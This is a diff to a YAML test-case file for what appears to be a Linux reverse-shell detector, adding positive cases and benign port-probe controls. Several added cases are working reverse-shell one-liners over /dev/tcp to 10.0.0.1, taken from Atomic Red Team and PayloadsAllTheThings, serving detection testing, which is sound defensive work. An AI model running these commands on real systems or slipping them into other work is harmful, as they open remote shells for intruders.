@@ -12,6 +12,63 @@ cases:
         name: bash
         cmd_line: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
 
+  - name: bash 双向 fd 反弹 shell（exec <>）
+    source: atomic T1059.004
+    class: 1007
+    os: linux
+    event:
+      process:
+        name: bash
+        cmd_line: "bash -c 'exec 5<>/dev/tcp/10.0.0.1/4444; cat <&5 | while read line; do $line 2>&5 >&5; done'"
+
+  - name: sh 输出接套接字、stdin 跟随
+    source: 常见变体（PayloadsAllTheThings）
+    class: 1007
+    os: linux
+    event:
+      process:
+        name: sh
+        cmd_line: "/bin/sh -i > /dev/tcp/10.0.0.1/4444 0<&1 2>&1"
+
+  - name: /dev/tcp 端口探测不是反弹 shell（良性对照）
+    source: pve 宿主机运维脚本实测误报
+    class: 1007
+    os: linux
+    expect: undetected
+    event:
+      process:
+        name: bash
+        cmd_line: "/usr/bin/bash -lc for hp in 10.1.1.11 10.1.1.30; do for p in 22 80 443; do timeout 3 bash -c \"echo > /dev/tcp/$hp/$p\" 2>/dev/null && echo \"$hp:$p OPEN\" || echo \"$hp:$p CLOSED\"; done; done"
+
+  - name: 高位 fd 196 反弹 shell
+    source: 常见变体（PayloadsAllTheThings）
+    class: 1007
+    os: linux
+    event:
+      process:
+        name: sh
+        cmd_line: "0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196"
+
+  - name: exec 3<> 只读 banner 抓取不是反弹 shell（良性对照）
+    source: pve 宿主机运维脚本实测误报
+    class: 1007
+    os: linux
+    expect: undetected
+    event:
+      process:
+        name: bash
+        cmd_line: "bash -c echo JUMP_OK; timeout 6 bash -c 'exec 3<>/dev/tcp/36.133.115.51/22 && head -c 30 <&3' 2>/dev/null"
+
+  - name: /dev/udp 探测带 2>&1 不是反弹 shell（良性对照）
+    source: pve 宿主机运维脚本实测误报
+    class: 1007
+    os: linux
+    expect: undetected
+    event:
+      process:
+        name: bash
+        cmd_line: "/usr/bin/bash -lc timeout 5 bash -c 'echo > /dev/udp/1.1.1.1/53' 2>&1 && echo ok"
+
   - name: nc -e 反连
     source: atomic T1059.004
     class: 1007
